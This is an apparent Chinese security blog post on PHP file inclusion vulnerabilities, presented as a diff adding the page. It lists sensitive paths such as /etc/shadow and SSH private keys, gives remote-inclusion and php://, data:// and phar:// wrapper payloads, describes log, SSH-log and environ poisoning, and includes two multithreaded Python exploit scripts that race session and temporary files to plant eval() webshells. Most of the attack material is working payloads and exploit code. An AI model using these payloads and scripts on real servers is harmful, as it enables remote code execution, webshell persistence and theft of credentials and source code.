@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>PHP 文件包含漏洞相关</title>
+
+<link rel='canonical' href='https://coollllllll.github.io/p/php-6/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='PHP 文件包含漏洞相关'>
+<meta property='og:description' content='go!'>
+<meta property='og:url' content='https://coollllllll.github.io/p/php-6/'>
+<meta property='og:site_name' content='cOOl &#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-10-09T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/php-6/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+<meta name="twitter:title" content="PHP 文件包含漏洞相关">
+<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://coollllllll.github.io/p/php-6/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/php-6/">
+                <img src="/p/php-6/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
+                        srcset="/p/php-6/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/php-6/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="534" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 文件包含漏洞相关" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%B8%B8%E7%94%A8/" style="background-color: #2a9d8f; color: #fff;">
+                常用
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/php-6/">PHP 文件包含漏洞相关</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        go!
+    </h3>
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 09, 2020</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h1 id="php文件包含漏洞相关">PHP文件包含漏洞相关</h1>
+<h2 id="类别">类别</h2>
+<ul>
+<li>本地文件包含</li>
+</ul>
+<p>如若关闭<code>allow_url_fopen</code>，一般只能包含本地文件</p>
+<ul>
+<li>远程文件包含</li>
+</ul>
+<p>需要开启<code>allow_url_fopen </code>和<code> allow_url_include</code></p>
+<blockquote>
+<p>注意：</p>
+<p>php.ini中，allow_url_fopen默认开启，而allow_url_include从php5.2之后默认关闭</p>
+</blockquote>
+<h2 id="包含的相关函数">包含的相关函数</h2>
+<p>引发文件包含漏洞的相关函数如下:</p>
+<ul>
+<li>include()</li>
+<li>include_once()</li>
+<li>require()</li>
+<li>require_once()</li>
+</ul>
+<blockquote>
+<p>require()在包含过程中出错(比如文件不存在)，会直接退出，不执行后续语句</p>
+<p>include()出错，会执行后续语句</p>
+<p>require_once()和include_once()，如果某文件已经被包含，则不会再包含该文件，避免重定义或变量赋值等问题</p>
+</blockquote>
+<p>以上四个函数，不论文件类型如何(比如图片、.txt)，都会<strong>直接被当作php文件进行解析</strong>。</p>
+<h2 id="利用">利用</h2>
+<p><figure 
+	>
+	<a href="/.%5cimage-20210825110338853.png" >
+		<img src="/.%5cimage-20210825110338853.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="本地敏感文件包含">本地敏感文件包含</h3>
+<p>常见敏感文件列表：</p>
+<pre tabindex="0"><code>Windows：
+    C:\boot.ini //查看系统版本
+    C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
+    C:\Windows\repair\sam //存储系统初次安装的密码
+    C:\Program Files\mysql\my.ini //Mysql配置
+    C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
+    C:\Windows\php.ini //php配置信息
+    C:\Windows\my.ini //Mysql配置信息
+    ...
+Linux：
+    /root/.ssh/authorized_keys
+    /root/.ssh/id_rsa
+    /root/.ssh/id_ras.keystore
+    /root/.ssh/known_hosts
+    /etc/passwd
+    /etc/shadow
+    /etc/my.cnf
+    /etc/httpd/conf/httpd.conf
+    /root/.bash_history
+    /root/.mysql_history
+    /proc/self/fd/fd[0-9]*(文件标识符)
+    /proc/mounts
+    /porc/config.gz
+</code></pre><h3 id="远程文件包含">远程文件包含</h3>
+<p>payload：</p>
+<pre tabindex="0"><code>[http|https|ftp]://www.test.com/shell.txt
+</code></pre><p>若后缀名写死，可以用 ? 绕过:</p>
+<pre tabindex="0"><code>//www.test.com/shell.txt?a
+</code></pre><h3 id="伪协议">伪协议</h3>
+<h4 id="file">file://</h4>
+<p>一般用来读本地文件：</p>
+<pre tabindex="0"><code>file://文件的绝对路径
+</code></pre><h4 id="php协议">php://协议</h4>
+<ul>
+<li>php://input</li>
+</ul>
+<p>php://input协议主要用于访问各个输入/输出流。</p>
+<blockquote>
+<p>php://input可读取<strong>未经处理过的</strong>POST数据</p>
+<p>当<code>enctype=&quot;multipart/form-data&quot;</code>的时候，php://input是无效的</p>
+</blockquote>
+<p>遇到<code>file_get_contents</code>，也可使用php://input获取POST内容。</p>
+<p><strong>利用条件：</strong></p>
+<pre tabindex="0"><code>allow_url_fopen 无要求
+allow_url_include = On
+</code></pre><p><strong>payload：</strong></p>
+<pre tabindex="0"><code>?file=php://input
+
+POST:
+&lt;?php phpinfo ?&gt;
+</code></pre><ul>
+<li>php://filter</li>
+</ul>
+<blockquote>
+<p>php://filter是一种元封装器，设计用于”数据流打开”时的”筛选过滤”应用，<strong>对本地磁盘文件进行读写</strong>。对于一体式(all-in-one)的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()。</p>
+</blockquote>
+<p>常见参数：</p>
+<pre tabindex="0"><code>string.toupper                                     //上面有写
+string.tolower                                     //转换为小写
+string.strip_tags                                  //去除html和php标记，比如&lt;?php?&gt;
+convert.base64-encode                              //base64编码
+convert.base64-decode                              //base64编码
+convert.quoted-printable-encode                    //quoted-printable 转 8bit
+convert.quoted-printable-decode                    //同上
+</code></pre><p><strong>利用条件：</strong></p>
+<p>默认</p>
+<p><strong>payload：</strong></p>
+<pre tabindex="0"><code>?file=php://filter/convert.base64-encode/resource=include.php
+</code></pre><p>解码后读取源码即可。</p>
+<h4 id="data协议">data://协议</h4>
+<p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中。</p>
+<p><strong>利用条件：</strong></p>
+<pre tabindex="0"><code>php版本&gt;=5.2
+
+allow_url_fopen = On
+
+allow_url_include = On
+</code></pre><p><strong>payload：</strong></p>
+<pre tabindex="0"><code>?file=data://text/plain,&lt;?php phpinfo()?&gt;
+?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+?file=data:text/plain,&lt;?php phpinfo()?&gt;
+?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+</code></pre><h4 id="phar协议">phar://协议</h4>
+<p>当文件上传被过滤，可结合文件包含利用。</p>
+<p><strong>利用条件：</strong></p>
+<pre tabindex="0"><code>php版本&gt;=5.3.0
+</code></pre><p><strong>payload-将一句话-shell.php压缩为shell.zip，修改后缀为上传点允许值，例如.png，上传至网站：</strong></p>
+<pre tabindex="0"><code>//指定绝对路径
+?file = phar:///var/www/html/test.png/phpinfo.txt
+
+//指定相对路径
+?file = phar://./test.png/phpinfo.txt
+</code></pre><h4 id="zip-bzip2-zlib协议">zip://, bzip2://, zlib://协议</h4>
+<p>这三个协议均属于压缩流，可访问压缩包中的子文件。后缀名无所谓，只要是zip文件头即可。</p>
+<p><strong>利用条件：</strong></p>
+<pre tabindex="0"><code>php版本&gt;5.3.0
+</code></pre><p>payload：</p>
+<pre tabindex="0"><code>zip:///var/www/html/phpinfo1.php#phpinfo.php
+</code></pre><blockquote>
+<p>注意<code>#</code>要url编码</p>
+</blockquote>
+<h4 id="伪协议总结">伪协议总结</h4>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 272; 
+			flex-basis: 654px"
+	>
+	<a href="/p/php-6/image-20220220144743550.png" data-size="886x325">
+		<img src="/p/php-6/image-20220220144743550.png"
+			width="886"
+			height="325"
+			srcset="/p/php-6/image-20220220144743550_hub3021d7fa2ca03a40b1ae3be0a2d0878_32227_480x0_resize_box_3.png 480w, /p/php-6/image-20220220144743550_hub3021d7fa2ca03a40b1ae3be0a2d0878_32227_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="日志文件">日志文件</h3>
+<p>Web请求一般会被记录再日志文件中，例如apache的<code>access log</code>和<code>error log</code>，该两个文件路径默认在<code>/var/log/apache2/</code>下。</p>
+<p>因此可以构造带有一句话木马内容的请求，会被记录日志中，再包含日志即可。</p>
+<blockquote>
+<p>注意：</p>
+<p>一般WWW用户是无权限读取该日志的，应用场景有限。</p>
+</blockquote>
+<h3 id="session文件">Session文件</h3>
+<h4 id="php中-upload_process-和-session相关配置介绍">PHP中 upload_process 和 session相关配置介绍</h4>
+<pre tabindex="0"><code>session.upload_progress.enabled = on
+session.upload_progress.cleanup = on
+session.upload_progress.prefix = &quot;upload_progress_&quot;
+session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;
+
+session.use_strict_mode
+</code></pre><ul>
+<li><code>enabled=on</code>表示当浏览器向服务器上传文件的时候，PHP会把本次文件上传的详细信息存储在session中</li>
+<li><code>cleanup=on</code>表示上传结束后，PHP会立即清空对应的session文件中的内容</li>
+<li>PHP文档中对<code>prefix</code>和<code>name</code>两个选项详细说明：</li>
+</ul>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 360; 
+			flex-basis: 864px"
+	>
+	<a href="/p/php-6/image-20220220150657188.png" data-size="1099x305">
+		<img src="/p/php-6/image-20220220150657188.png"
+			width="1099"
+			height="305"
+			srcset="/p/php-6/image-20220220150657188_huea530170c08e2e87bae52a9cc998cae8_146015_480x0_resize_box_3.png 480w, /p/php-6/image-20220220150657188_huea530170c08e2e87bae52a9cc998cae8_146015_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<ul>
+<li><code>session.use_strict_mode=0</code>，表明用户可以自定义Session ID。具体而言，我们在Cookie中设置<code>Cookie:PHPSESSID=test</code>，PHP将会在服务器上session存储的位置创建一个文件<code>sess_test</code>，即使用户没有初始化Session，PHP也会自动初始化Session，并且产生一个键值，这个键值由<code>session.upload_progress.prefix</code>+<code>session.upload_progress_name</code>组成，最后被写入<code>sess_test</code>文件中。</li>
+</ul>
+<h4 id="利用条件">利用条件</h4>
+<ul>
+<li>
+<p>能够创建session文件并知晓路径</p>
+</li>
+<li>
+<p>内容可控</p>
+</li>
+</ul>
+<h4 id="session路径">session路径</h4>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 3858; 
+			flex-basis: 9260px"
+	>
+	<a href="/p/php-6/image-20220220153139371.png" data-size="926x24">
+		<img src="/p/php-6/image-20220220153139371.png"
+			width="926"
+			height="24"
+			srcset="/p/php-6/image-20220220153139371_hu3d839529f0c87b5e57d2cecb20416c38_2431_480x0_resize_box_3.png 480w, /p/php-6/image-20220220153139371_hu3d839529f0c87b5e57d2cecb20416c38_2431_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>常见：</p>
+<ul>
+<li>/tmp/</li>
+<li>/tmp/sessions</li>
+<li>/var/lib/php/</li>
+<li>/var/lib/php/sessions/</li>
+</ul>
+<h4 id="利用思路">利用思路</h4>
+<p>由于<strong>上传文件结束后，session文件会被清除</strong>，我们可以上传大文件，并在上传时<strong>自定义session</strong>让服务端创建session文件；同时使用条件竞争，在session文件被删除前抢先进行文件包含。</p>
+<ul>
+<li>bp抓包，跑上传大文件的intrude</li>
+<li>跑文件包含的intrude</li>
+</ul>
+<p>利用脚本多线程跑：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">io</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="n">sessid</span> <span class="o">=</span> <span class="s1">&#39;test&#39;</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;cmd&#34;</span><span class="p">:</span><span class="s2">&#34;system(&#39;whoami&#39;);&#34;</span><span class="p">}</span>
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span> <span class="s1">&#39;http://127.0.0.1:7777/test56.php&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span> <span class="s1">&#39;&lt;?php eval($_POST[&#34;cmd&#34;]);?&gt;&#39;</span><span class="p">},</span> <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;haha.txt&#39;</span><span class="p">,</span><span class="n">f</span><span class="p">)},</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">sessid</span><span class="p">}</span> <span class="p">)</span>
+<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1:7777/test56.php?file=session/sess_&#39;</span><span class="o">+</span><span class="n">sessid</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s1">&#39;haha.txt&#39;</span> <span class="ow">in</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="n">event</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+++++++++++++]retry&#34;</span><span class="p">)</span>
+<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">event</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
+    <span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span> 
+            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
+            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
+</code></pre></div><h3 id="ssh-log">SSH log</h3>
+<p><strong>条件：</strong></p>
+<ul>
+<li>知晓SSH log路径，且可读</li>
+</ul>
+<p>一般在<code>/var/log/auth.log</code></p>
+<p><strong>payload：</strong></p>
+<pre tabindex="0"><code>ssh &lt;?php phpinfo();?&gt;@ip
+ 
+再进行本地包含
+</code></pre><h3 id="environ">environ</h3>
+<p>PHP以cgi方式运行,<code>proc/self/environ</code>会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
+<p><strong>条件：</strong></p>
+<ul>
+<li>CGI方式运行</li>
+<li>environ文件可读</li>
+</ul>
+<h3 id="临时文件">临时文件</h3>
+<p>上述这些方法要求能够包含不再Web目录下的文件，一旦PHP设置了open_basedir，则很可能会使得攻击失效。</p>
+<p><strong>向服务器上任意 php 文件以 form-data 式提交请求上传数据时，会生成临时文件：</strong></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 172; 
+			flex-basis: 414px"
+	>
+	<a href="/p/php-6/image-20220220160912031.png" data-size="574x332">
+		<img src="/p/php-6/image-20220220160912031.png"
+			width="574"
+			height="332"
+			srcset="/p/php-6/image-20220220160912031_hu32b936f6d8558029cbc85dedcf72f901_92822_480x0_resize_box_3.png 480w, /p/php-6/image-20220220160912031_hu32b936f6d8558029cbc85dedcf72f901_92822_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><strong>利用：</strong></p>
+<ul>
+<li>临时文件在短时间内会被删除，所以需要竞争条件</li>
+<li>而临时文件名也不知道，如果服务器上有phpinfo，可以从<code>upload_tmp_dir</code>上获取</li>
+</ul>
+<p>参考exp：https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py</p>
+<h3 id="自包含">自包含</h3>
+<p>让 php 包含自身从而导致死循环然后 php 就会崩溃，那么它所产生的临时文件就会被保留，而不会被清除，再进行包含。</p>
+<p>思路：</p>
+<ul>
+<li>上传产生临时文件</li>
+<li>phpinfo获取临时文件名</li>
+<li>自包含<code>/test.php?include=test.php</code>形成无穷递归，中断删除过程</li>
+<li>本地包含</li>
+</ul>
+<h3 id="上传文件崩溃">上传文件+崩溃</h3>
+<p>让 php 包含自身从而导致死循环然后 php 就会崩溃，如果请求中同时存在一个上传文件的请求，则上传的该文件就会被保留。</p>
+<p><strong>利用脚本：</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">itertools</span>
+<span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">letters</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;x.x.x.x&#34;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://</span><span class="si">%s</span><span class="s2">:</span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">upload_file_to_include</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">file_content</span><span class="p">):</span>
+    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;evil.jpg&#39;</span><span class="p">,</span> <span class="n">file_content</span><span class="p">,</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)}</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="n">e</span>
+<span class="k">def</span> <span class="nf">generate_tmp_files</span><span class="p">():</span>
+    <span class="n">webshell_content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php eval($_REQUEST[c]);?&gt;&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span>
+        <span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">file_content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php if(file_put_contents(&#34;/tmp/ssh_session_HD89q2&#34;, base64_decode(&#34;</span><span class="si">%s</span><span class="s1">&#34;))){echo &#34;flag&#34;;}?&gt;&#39;</span> <span class="o">%</span> <span class="p">(</span>
+        <span class="n">webshell_content</span><span class="p">)</span>
+    <span class="n">phpinfo_url</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">/include.php?f=include.php&#34;</span> <span class="o">%</span> <span class="p">(</span>
+        <span class="n">base_url</span><span class="p">)</span>
+    <span class="n">length</span> <span class="o">=</span> <span class="mi">6</span>
+    <span class="n">times</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">charset</span><span class="p">)</span> <span class="o">**</span> <span class="p">(</span><span class="n">length</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="n">times</span><span class="p">):</span>
+        <span class="nb">print</span> <span class="s2">&#34;[+] </span><span class="si">%d</span><span class="s2"> / </span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">times</span><span class="p">)</span>
+        <span class="n">upload_file_to_include</span><span class="p">(</span><span class="n">phpinfo_url</span><span class="p">,</span> <span class="n">file_content</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">generate_tmp_files</span><span class="p">()</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div><h2 id="总结">总结</h2>
+<p>当找不到本地可包含的文件，有三种方法可行：</p>
+<ul>
+<li>产生临时文件，竞争条件getshell</li>
+<li>使用session.upload_process，包含session文件</li>
+<li>让PHP崩溃，同时产生临时文件或上传文件，都可被保留。</li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/csrf/">
+        
+        
+            <div class="article-image">
+                <img src="/p/csrf/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CSRF 相关"
+                        data-key="csrf" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CSRF 相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mssql/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mssql/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MSSQL 注入与提权相关"
+                        data-key="mssql" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MSSQL 注入与提权相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-1/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 提权"
+                        data-key="mysql-1" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 提权</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 注入写 shell"
+                        data-key="mysql-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 注入写 shell</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-2"
+                        data-key="php-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化-2</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
